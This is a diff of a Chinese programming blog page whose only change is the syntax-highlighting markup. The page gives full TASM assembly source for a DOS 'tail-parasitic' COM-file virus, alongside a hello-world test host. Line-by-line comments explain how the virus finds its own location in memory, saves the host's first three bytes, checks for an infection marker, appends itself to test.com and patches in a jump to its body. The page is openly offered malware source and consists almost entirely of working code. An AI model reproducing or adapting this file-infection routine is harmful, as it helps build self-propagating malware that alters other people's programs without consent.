@@ -1,118 +1,118 @@
-<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <title>知不知</title> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="theme-color" content="#157878"> <meta name="baidu-site-verification" content="" /> <meta name="apple-itunes-app" content="app-id=1227288468, app-argument=https://luowei.github.io/list/docs/asm/2011-03-11-%E7%94%A8%E6%B1%87%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E5%B0%BE%E5%AF%84%E7%94%9FVirus.html"> <link rel="stylesheet" href="https://luowei.github.io/list/assets/css/normalize.css"> <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'> <link rel="stylesheet" href="https://luowei.github.io/list/assets/css/cayman.css"> </head> <body> <section class="page-header"> <h1 class="project-name">知不知</h1> <h2 class="project-tagline"><a style="color:#ffffff;" href="http://luowei.github.io/list">知不知</a> 是一个代码爱好者的技术知识分享部落格。</h2> <a href="http://wodedata.com" target="_blank" class="btn">wodedata</a> <a href="https://luowei.github.io/list" class="btn">home</a> <a href="http://app.wodedata.com" target="_blank" class="btn">APP作品</a> </section> <section class="main-content"> <!-- 标题 --> <h2>ASM-用汇编写一个尾寄生Virus</h2> <!-- Google Ads --> <script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> <p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-8760692904992206" data-ad-slot="2948937366"></ins> <script> (adsbygoogle = window.adsbygoogle || []).push({}); </script></p> <p>code格式化highlight输出参考：<a href="http://tinker.kotaweaver.com/blog/?p=152">http://tinker.kotaweaver.com/blog/?p=152</a></p> <p><strong>在tasm 编译通过：</strong></p> <h3 id="测试程序">测试程序：</h3> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">;DTA数据传输区,存放文件的相关控制信息，它的作用是在磁盘文件与程序之间做一个桥梁，</span>
-<span class="c">;程序写文件时先写DTA，程序读文件时就直接从DTA中读取文件的信息。</span>
+<!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <title>知不知</title> <meta name="viewport" content="width=device-width, initial-scale=1"> <meta name="theme-color" content="#157878"> <meta name="baidu-site-verification" content="" /> <meta name="apple-itunes-app" content="app-id=1227288468, app-argument=https://luowei.github.io/list/docs/asm/2011-03-11-%E7%94%A8%E6%B1%87%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E5%B0%BE%E5%AF%84%E7%94%9FVirus.html"> <link rel="stylesheet" href="https://luowei.github.io/list/assets/css/normalize.css"> <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'> <link rel="stylesheet" href="https://luowei.github.io/list/assets/css/cayman.css"> </head> <body> <section class="page-header"> <h1 class="project-name">知不知</h1> <h2 class="project-tagline"><a style="color:#ffffff;" href="http://luowei.github.io/list">知不知</a> 是一个代码爱好者的技术知识分享部落格。</h2> <a href="http://wodedata.com" target="_blank" class="btn">wodedata</a> <a href="https://luowei.github.io/list" class="btn">home</a> <a href="http://app.wodedata.com" target="_blank" class="btn">APP作品</a> </section> <section class="main-content"> <!-- 标题 --> <h2>ASM-用汇编写一个尾寄生Virus</h2> <!-- Google Ads --> <script async="" src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> <p><ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-8760692904992206" data-ad-slot="2948937366"></ins> <script> (adsbygoogle = window.adsbygoogle || []).push({}); </script></p> <p>code格式化highlight输出参考：<a href="http://tinker.kotaweaver.com/blog/?p=152">http://tinker.kotaweaver.com/blog/?p=152</a></p> <p><strong>在tasm 编译通过：</strong></p> <h3 id="测试程序">测试程序：</h3> <div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">;DTA数据传输区,存放文件的相关控制信息，它的作用是在磁盘文件与程序之间做一个桥梁，</span>
+<span class="c1">;程序写文件时先写DTA，程序读文件时就直接从DTA中读取文件的信息。</span>
 
-<span class="p">.</span><span class="n">model</span> <span class="n">tiny</span>
-<span class="p">.</span><span class="n">code</span>
-    <span class="n">org</span> <span class="mi">0100</span><span class="n">h</span>
+<span class="nf">.model</span> <span class="nv">tiny</span>
+<span class="nf">.code</span>
+    <span class="nf">org</span> <span class="mh">0100h</span>
     
-<span class="n">ok</span><span class="o">:</span> <span class="k">mov</span> <span class="n">dx</span><span class="p">,</span><span class="n">offset</span> <span class="n">message</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">09</span><span class="n">h</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">4</span><span class="n">ch</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">ret</span>
-    <span class="n">message</span> <span class="kt">db</span> <span class="err">'</span><span class="n">HelloWorld</span><span class="err">!!'</span><span class="p">,</span><span class="mi">0</span><span class="n">dh</span><span class="p">,</span><span class="mi">0</span><span class="n">ah</span><span class="p">,</span><span class="sc">'$'</span>
-<span class="n">end</span> <span class="n">ok</span>
+<span class="nl">ok:</span> <span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span><span class="nv">offset</span> <span class="nv">message</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">09h</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">4ch</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">ret</span>
+    <span class="nf">message</span> <span class="nv">db</span> <span class="s">'HelloWorld!!'</span><span class="p">,</span><span class="mh">0dh</span><span class="p">,</span><span class="mh">0ah</span><span class="p">,</span><span class="s">'$'</span>
+<span class="nf">end</span> <span class="nv">ok</span>
 
-<span class="n">Virus</span><span class="err">程序：</span>
-<span class="p">.</span><span class="n">model</span> <span class="n">tiny</span>
-<span class="p">.</span><span class="n">code</span>
-<span class="n">org</span> <span class="mi">100</span><span class="n">h</span>
-<span class="n">start</span><span class="o">:</span>
-    <span class="kt">db</span> <span class="mi">90</span><span class="n">h</span><span class="p">,</span><span class="mi">90</span><span class="n">h</span><span class="p">,</span><span class="mi">90</span><span class="n">h</span>            <span class="c">;三个无操作码,空出三个字节</span>
-<span class="n">vstart</span><span class="o">:</span>                        <span class="c">;用IP指针减去偏移量的方式，做到重定位</span>
-    <span class="n">ok</span><span class="o">:</span><span class="k">call</span> <span class="n">locate</span>            <span class="c">;病毒代码的起始,遇到call寄存器入栈，ip也同样入栈</span>
+<span class="nf">Virus</span><span class="err">程序：</span>
+<span class="nf">.model</span> <span class="nv">tiny</span>
+<span class="nf">.code</span>
+<span class="nf">org</span> <span class="mh">100h</span>
+<span class="nl">start:</span>
+    <span class="kd">db</span> <span class="mh">90h</span><span class="p">,</span><span class="mh">90h</span><span class="p">,</span><span class="mh">90h</span>            <span class="c1">;三个无操作码,空出三个字节</span>
+<span class="nl">vstart:</span>                        <span class="c1">;用IP指针减去偏移量的方式，做到重定位</span>
+    <span class="nl">ok:</span><span class="nf">call</span> <span class="nv">locate</span>            <span class="c1">;病毒代码的起始,遇到call寄存器入栈，ip也同样入栈</span>
     
-<span class="n">locate</span><span class="o">:</span><span class="k">pop</span> <span class="n">si</span>                <span class="c">;将ip地址出栈到si寄存器中</span>
-    <span class="k">sub</span> <span class="n">si</span><span class="p">,</span><span class="n">offset</span> <span class="n">locate</span>    <span class="c">;减去病毒的起始地址，用于回到宿主程序的地址</span>
+<span class="nl">locate:</span><span class="nf">pop</span> <span class="nb">si</span>                <span class="c1">;将ip地址出栈到si寄存器中</span>
+    <span class="nf">sub</span> <span class="nb">si</span><span class="p">,</span><span class="nv">offset</span> <span class="nv">locate</span>    <span class="c1">;减去病毒的起始地址，用于回到宿主程序的地址</span>
     
-<span class="n">writeold</span><span class="o">:</span>                    <span class="c">;将100h处的内存代码写为我们病毒保存的3个字节，第1次运行是一条退出指令</span>
-                            <span class="c">;以后运行的时候，它就是我们宿主程序开始的三个字节</span>
-    <span class="k">push</span> <span class="n">si</span>                <span class="c">;保存si</span>
-    <span class="k">mov</span> <span class="n">di</span><span class="p">,</span><span class="mi">100</span><span class="n">h</span>            <span class="c">;把100h送到目的地址DI寄存器</span>
-    <span class="k">lea</span> <span class="n">si</span><span class="p">,</span><span class="err">[</span><span class="n">si</span><span class="o">+</span><span class="n">f3byte</span><span class="err">]</span>        <span class="c">;在内存处写入3个字节</span>
-    <span class="k">movsb</span>
-    <span class="k">movsw</span>
-    <span class="k">pop</span> <span class="n">si</span>
+<span class="nl">writeold:</span>                    <span class="c1">;将100h处的内存代码写为我们病毒保存的3个字节，第1次运行是一条退出指令</span>
+                            <span class="c1">;以后运行的时候，它就是我们宿主程序开始的三个字节</span>
+    <span class="nf">push</span> <span class="nb">si</span>                <span class="c1">;保存si</span>
+    <span class="nf">mov</span> <span class="nb">di</span><span class="p">,</span><span class="mh">100h</span>            <span class="c1">;把100h送到目的地址DI寄存器</span>
+    <span class="nf">lea</span> <span class="nb">si</span><span class="p">,[</span><span class="nb">si</span><span class="o">+</span><span class="nv">f3byte</span><span class="p">]</span>        <span class="c1">;在内存处写入3个字节</span>
+    <span class="nf">movsb</span>
+    <span class="nf">movsw</span>
+    <span class="nf">pop</span> <span class="nb">si</span>
     
-<span class="n">openf</span><span class="o">:</span>                        <span class="c">;打开文件</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">3</span><span class="n">d02h</span>            <span class="c">;3dh功能调用，调用参数ds:dx=ASCIZ串地址，al=访问文件共享方式，</span>
-                            <span class="c">;0=读，1=写，2=读/写;若调用成功，返回参数AX=文件代号</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="err">[</span><span class="n">fname</span><span class="o">+</span><span class="n">si</span><span class="err">]</span>        <span class="c">;文件名所在的地址</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>                    <span class="c">;DOS中断</span>
-    <span class="k">jc</span> <span class="n">error1</span>                <span class="c">;没有打开跳到error1</span>
-    <span class="k">xchg</span> <span class="n">ax</span><span class="p">,</span><span class="n">bx</span>                <span class="c">;将打开文件功能调用的出口参数（文件代号）存到bx当中</span>
+<span class="nl">openf:</span>                        <span class="c1">;打开文件</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">3d02h</span>            <span class="c1">;3dh功能调用，调用参数ds:dx=ASCIZ串地址，al=访问文件共享方式，</span>
+                            <span class="c1">;0=读，1=写，2=读/写;若调用成功，返回参数AX=文件代号</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,[</span><span class="nv">fname</span><span class="o">+</span><span class="nb">si</span><span class="p">]</span>        <span class="c1">;文件名所在的地址</span>
+    <span class="nf">int</span> <span class="mh">21h</span>                    <span class="c1">;DOS中断</span>
+    <span class="nf">jc</span> <span class="nv">error1</span>                <span class="c1">;没有打开跳到error1</span>
+    <span class="nf">xchg</span> <span class="nb">ax</span><span class="p">,</span><span class="nb">bx</span>                <span class="c1">;将打开文件功能调用的出口参数（文件代号）存到bx当中</span>
     
-<span class="n">loadold</span><span class="o">:</span>                    <span class="c">;保存宿主程序的前3个节字的代码在这里</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">4200</span><span class="n">h</span>            <span class="c">;42号功能调用，移动文件指针，重新读取原先的3个字节，让它从头开始</span>
-    <span class="k">xor</span> <span class="n">cx</span><span class="p">,</span><span class="n">cx</span>                <span class="c">;将cx清空，把偏移量高位置零</span>
-    <span class="k">xor</span> <span class="n">dx</span><span class="p">,</span><span class="n">dx</span>                <span class="c">;将dx清空，把偏移量低位置零</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">3</span><span class="n">fh</span>                <span class="c">;3f功能调用，读文件或设备</span>
-    <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span><span class="mi">3</span>                <span class="c">;读3个字节</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="err">[</span><span class="n">f3byte</span><span class="o">+</span><span class="n">si</span><span class="err">]</span>        <span class="c">;将它保存在宿主文件头部的那3个字节处的内存单元</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
+<span class="nl">loadold:</span>                    <span class="c1">;保存宿主程序的前3个节字的代码在这里</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">4200h</span>            <span class="c1">;42号功能调用，移动文件指针，重新读取原先的3个字节，让它从头开始</span>
+    <span class="nf">xor</span> <span class="nb">cx</span><span class="p">,</span><span class="nb">cx</span>                <span class="c1">;将cx清空，把偏移量高位置零</span>
+    <span class="nf">xor</span> <span class="nb">dx</span><span class="p">,</span><span class="nb">dx</span>                <span class="c1">;将dx清空，把偏移量低位置零</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">3fh</span>                <span class="c1">;3f功能调用，读文件或设备</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mi">3</span>                <span class="c1">;读3个字节</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,[</span><span class="nv">f3byte</span><span class="o">+</span><span class="nb">si</span><span class="p">]</span>        <span class="c1">;将它保存在宿主文件头部的那3个字节处的内存单元</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
     
-<span class="n">judge</span><span class="o">:</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">4202</span><span class="n">h</span>            <span class="c">;42号调用，移动文件指针，al=2从文件尾绝对位移</span>
-    <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span><span class="mi">0</span><span class="n">ffffh</span>            <span class="c">;偏移量高位,</span>
-    <span class="k">mov</span> <span class="n">dx</span><span class="p">,</span><span class="mi">0</span><span class="n">fffeh</span>            <span class="c">;偏移量低位,负2的补码0fffeh</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">3</span><span class="n">fh</span>                <span class="c">;3f功能调用，读文件或设备，读取倒数的两个字?</span>
-    <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span><span class="mi">2</span>                <span class="c">;cx为要读取字节的数量</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="err">[</span><span class="n">si</span><span class="o">+</span><span class="n">vid</span><span class="err">]</span>        <span class="c">;将vid的偏移地址存放到dx（偏移量低位）当中</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">cmp</span> <span class="n">word</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">vid</span><span class="o">+</span><span class="n">si</span><span class="err">]</span><span class="p">,</span><span class="mi">0</span><span class="n">fecah</span>    <span class="c">;将取出的两个字节的内容与特征码进行比较</span>
-    <span class="k">jz</span> <span class="n">closef</span>                <span class="c">;如果相等，说明这个文件已经被感染过了，跳转到关闭文件</span>
-    <span class="k">mov</span> <span class="n">word</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">vid</span><span class="o">+</span><span class="n">si</span><span class="err">]</span><span class="p">,</span><span class="mi">0</span><span class="n">fecah</span>    <span class="c">;否则继续感染这个文件，在感染之前将其特征位设置为0fecah</span>
+<span class="nl">judge:</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">4202h</span>            <span class="c1">;42号调用，移动文件指针，al=2从文件尾绝对位移</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mh">0ffffh</span>            <span class="c1">;偏移量高位,</span>
+    <span class="nf">mov</span> <span class="nb">dx</span><span class="p">,</span><span class="mh">0fffeh</span>            <span class="c1">;偏移量低位,负2的补码0fffeh</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">3fh</span>                <span class="c1">;3f功能调用，读文件或设备，读取倒数的两个字?</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mi">2</span>                <span class="c1">;cx为要读取字节的数量</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,[</span><span class="nb">si</span><span class="o">+</span><span class="nv">vid</span><span class="p">]</span>        <span class="c1">;将vid的偏移地址存放到dx（偏移量低位）当中</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">cmp</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">vid</span><span class="o">+</span><span class="nb">si</span><span class="p">],</span><span class="mh">0fecah</span>    <span class="c1">;将取出的两个字节的内容与特征码进行比较</span>
+    <span class="nf">jz</span> <span class="nb">cl</span><span class="nv">osef</span>                <span class="c1">;如果相等，说明这个文件已经被感染过了，跳转到关闭文件</span>
+    <span class="nf">mov</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">vid</span><span class="o">+</span><span class="nb">si</span><span class="p">],</span><span class="mh">0fecah</span>    <span class="c1">;否则继续感染这个文件，在感染之前将其特征位设置为0fecah</span>
     
-<span class="n">pointf</span><span class="o">:</span>                <span class="c">;重新定位文件的读写指针</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">4202</span><span class="n">h</span>    <span class="c">;42号功能调用，移动文件指针，调用参数 BX=文件代号，CX:DX=位移量，AL=2从文件尾</span>
-    <span class="k">xor</span> <span class="n">cx</span><span class="p">,</span><span class="n">cx</span>        <span class="c">;将cx清零，代表偏移量的高位</span>
-    <span class="k">xor</span> <span class="n">dx</span><span class="p">,</span><span class="n">dx</span>        <span class="c">;将dx清零，代表偏移量的低位</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>        <span class="c">;DOS中断，偏移量都为零，说明从文件的尾部开始，若成功，dx:ax=新指针位置;失败，ax=错误码</span>
-    <span class="n">error1</span><span class="o">:</span><span class="k">jc</span> <span class="n">error2</span>    <span class="c">;错误跳转的地址</span>
-    <span class="k">sub</span> <span class="n">ax</span><span class="p">,</span><span class="mi">3</span>        <span class="c">;JMP指令占3字节，ax(上面文件读指针的出口参数)存放着写入病毒代码的字节数</span>
-    <span class="k">mov</span> <span class="n">word</span> <span class="n">ptr</span> <span class="n">entry</span><span class="err">[</span><span class="n">si</span><span class="o">+</span><span class="mi">1</span><span class="err">]</span><span class="p">,</span><span class="n">ax</span>    <span class="c">;ax减3获得JMP的偏移地址,再送到entry的下一地址</span>
+<span class="nl">pointf:</span>                <span class="c1">;重新定位文件的读写指针</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">4202h</span>    <span class="c1">;42号功能调用，移动文件指针，调用参数 BX=文件代号，CX:DX=位移量，AL=2从文件尾</span>
+    <span class="nf">xor</span> <span class="nb">cx</span><span class="p">,</span><span class="nb">cx</span>        <span class="c1">;将cx清零，代表偏移量的高位</span>
+    <span class="nf">xor</span> <span class="nb">dx</span><span class="p">,</span><span class="nb">dx</span>        <span class="c1">;将dx清零，代表偏移量的低位</span>
+    <span class="nf">int</span> <span class="mh">21h</span>        <span class="c1">;DOS中断，偏移量都为零，说明从文件的尾部开始，若成功，dx:ax=新指针位置;失败，ax=错误码</span>
+    <span class="nl">error1:</span><span class="nf">jc</span> <span class="nv">error2</span>    <span class="c1">;错误跳转的地址</span>
+    <span class="nf">sub</span> <span class="nb">ax</span><span class="p">,</span><span class="mi">3</span>        <span class="c1">;JMP指令占3字节，ax(上面文件读指针的出口参数)存放着写入病毒代码的字节数</span>
+    <span class="nf">mov</span> <span class="kt">word</span> <span class="nv">ptr</span> <span class="nv">entry</span><span class="p">[</span><span class="nb">si</span><span class="o">+</span><span class="mi">1</span><span class="p">],</span><span class="nb">ax</span>    <span class="c1">;ax减3获得JMP的偏移地址,再送到entry的下一地址</span>
     
-<span class="n">writef</span><span class="o">:</span>                <span class="c">;写文件</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">40</span><span class="n">h</span>    <span class="c">;40h调用，写文件或设备，ds:dx=数据缓冲区地址，bx=文件代号，cx=写入的字节数;若调用成功返回ax=实;;际实际写入的字节数</span>
-    <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span><span class="n">filel</span>    <span class="c">;把要写入文件的长度存到cx</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="err">[</span><span class="n">vstart</span><span class="o">+</span><span class="n">si</span><span class="err">]</span>    <span class="c">;将病毒的起始地址存到dx当中</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>            <span class="c">;DOS中断</span>
+<span class="nl">writef:</span>                <span class="c1">;写文件</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">40h</span>    <span class="c1">;40h调用，写文件或设备，ds:dx=数据缓冲区地址，bx=文件代号，cx=写入的字节数;若调用成功返回ax=实;;际实际写入的字节数</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="nv">filel</span>    <span class="c1">;把要写入文件的长度存到cx</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,[</span><span class="nv">vstart</span><span class="o">+</span><span class="nb">si</span><span class="p">]</span>    <span class="c1">;将病毒的起始地址存到dx当中</span>
+    <span class="nf">int</span> <span class="mh">21h</span>            <span class="c1">;DOS中断</span>
     
-<span class="n">writejmp</span><span class="o">:</span>            <span class="c">;写跳转指令</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">4200</span><span class="n">h</span>    <span class="c">;42号调用，移动文件指针，将读写地址定义到起始处</span>
-    <span class="k">xor</span> <span class="n">cx</span><span class="p">,</span><span class="n">cx</span>        <span class="c">;将cx清零，代表偏移量的高位</span>
-    <span class="k">xor</span> <span class="n">dx</span><span class="p">,</span><span class="n">dx</span>        <span class="c">;将dx清零，代表偏移量的低位</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">40</span><span class="n">h</span>        <span class="c">;40号调用，写文件</span>
-    <span class="k">mov</span> <span class="n">cx</span><span class="p">,</span><span class="mi">3</span>        <span class="c">;写3个字节</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="err">[</span><span class="n">entry</span><span class="o">+</span><span class="n">si</span><span class="err">]</span>    <span class="c">;写的字节在entry里的那条机器码</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
+<span class="nl">writejmp:</span>            <span class="c1">;写跳转指令</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">4200h</span>    <span class="c1">;42号调用，移动文件指针，将读写地址定义到起始处</span>
+    <span class="nf">xor</span> <span class="nb">cx</span><span class="p">,</span><span class="nb">cx</span>        <span class="c1">;将cx清零，代表偏移量的高位</span>
+    <span class="nf">xor</span> <span class="nb">dx</span><span class="p">,</span><span class="nb">dx</span>        <span class="c1">;将dx清零，代表偏移量的低位</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">40h</span>        <span class="c1">;40号调用，写文件</span>
+    <span class="nf">mov</span> <span class="nb">cx</span><span class="p">,</span><span class="mi">3</span>        <span class="c1">;写3个字节</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,[</span><span class="nv">entry</span><span class="o">+</span><span class="nb">si</span><span class="p">]</span>    <span class="c1">;写的字节在entry里的那条机器码</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
     
-<span class="n">closef</span><span class="o">:</span>                <span class="c">;关闭文件</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">3</span><span class="n">eh</span>        <span class="c">;3eh号调用，关闭文件</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
+<span class="nl">closef:</span>                <span class="c1">;关闭文件</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mh">3eh</span>        <span class="c1">;3eh号调用，关闭文件</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
     
-<span class="n">error2</span><span class="o">:</span>
+<span class="nl">error2:</span>
 
-<span class="n">hello</span><span class="o">:</span>                <span class="c">;为了程序试验方便，我们让它打印一句话</span>
-    <span class="k">lea</span> <span class="n">dx</span><span class="p">,</span><span class="err">[</span><span class="n">message</span><span class="o">+</span><span class="n">si</span><span class="err">]</span>    <span class="c">;要打印显示的字符串的地址</span>
-    <span class="k">mov</span> <span class="n">ah</span><span class="p">,</span><span class="mi">9</span>        <span class="c">;9号调用显示字符串</span>
-    <span class="k">int</span> <span class="mi">21</span><span class="n">h</span>
-    <span class="k">mov</span> <span class="n">ax</span><span class="p">,</span><span class="mi">100</span><span class="n">h</span>    <span class="c">;这些都完成之后就让它跳回100h</span>
-    <span class="k">push</span> <span class="n">ax</span>        <span class="c">;将ax入栈    </span>
-    <span class="k">ret</span>                <span class="c">;返回指令，将ax返回到IP中</span>
+<span class="nl">hello:</span>                <span class="c1">;为了程序试验方便，我们让它打印一句话</span>
+    <span class="nf">lea</span> <span class="nb">dx</span><span class="p">,[</span><span class="nv">message</span><span class="o">+</span><span class="nb">si</span><span class="p">]</span>    <span class="c1">;要打印显示的字符串的地址</span>
+    <span class="nf">mov</span> <span class="nb">ah</span><span class="p">,</span><span class="mi">9</span>        <span class="c1">;9号调用显示字符串</span>
+    <span class="nf">int</span> <span class="mh">21h</span>
+    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span><span class="mh">100h</span>    <span class="c1">;这些都完成之后就让它跳回100h</span>
+    <span class="nf">push</span> <span class="nb">ax</span>        <span class="c1">;将ax入栈    </span>
+    <span class="nf">ret</span>                <span class="c1">;返回指令，将ax返回到IP中</span>
     
-<span class="n">message</span> <span class="kt">db</span> <span class="s">"cafe !"</span><span class="p">,</span><span class="mi">0</span><span class="n">dh</span><span class="p">,</span><span class="mi">0</span><span class="n">ah</span>    <span class="c">;0dh 回车符，0ah换行符</span>
-        <span class="kt">db</span> <span class="sc">'$'</span>                <span class="c">;表这个字符串结束?</span>
+<span class="nf">message</span> <span class="nv">db</span> <span class="s">"cafe !"</span><span class="p">,</span><span class="mh">0dh</span><span class="p">,</span><span class="mh">0ah</span>    <span class="c1">;0dh 回车符，0ah换行符</span>
+        <span class="kd">db</span> <span class="s">'$'</span>                <span class="c1">;表这个字符串结束?</span>
         
-<span class="n">f3byte</span> <span class="kt">db</span> <span class="mi">0</span><span class="n">cdh</span><span class="p">,</span><span class="mi">20</span><span class="n">h</span><span class="p">,</span><span class="mi">0</span>         <span class="c">;int 20h 的机器码，退出指令</span>
-<span class="n">entry</span> <span class="kt">db</span> <span class="mi">0</span><span class="n">e9h</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>             <span class="c">;jmp 0 的机器码</span>
-<span class="n">fname</span> <span class="kt">db</span> <span class="s">"test.com"</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="sc">'$'</span>    <span class="c">;指令文件名的缓冲区</span>
-<span class="n">vid</span> <span class="kt">db</span> <span class="mi">0</span><span class="n">cah</span><span class="p">,</span><span class="mi">0</span><span class="n">feh</span>            <span class="c">;病毒特征码</span>
-<span class="n">filel</span> <span class="k">equ</span> <span class="err">$</span><span class="o">-</span><span class="n">vstart</span>            <span class="c">;前面空出的三个字节只有在病毒第一次运行时才有意义</span>
+<span class="nf">f3byte</span> <span class="nv">db</span> <span class="mh">0cdh</span><span class="p">,</span><span class="mh">20h</span><span class="p">,</span><span class="mi">0</span>         <span class="c1">;int 20h 的机器码，退出指令</span>
+<span class="nf">entry</span> <span class="nv">db</span> <span class="mh">0e9h</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span>             <span class="c1">;jmp 0 的机器码</span>
+<span class="nf">fname</span> <span class="nv">db</span> <span class="s">"test.com"</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s">'$'</span>    <span class="c1">;指令文件名的缓冲区</span>
+<span class="nf">vid</span> <span class="nv">db</span> <span class="mh">0cah</span><span class="p">,</span><span class="mh">0feh</span>            <span class="c1">;病毒特征码</span>
+<span class="no">filel</span><span class="kd"> equ</span> <span class="kc">$</span><span class="o">-</span><span class="nv">vstart</span>            <span class="c1">;前面空出的三个字节只有在病毒第一次运行时才有意义</span>
 
-<span class="n">end</span> <span class="n">start</span>
+<span class="nf">end</span> <span class="nv">start</span>
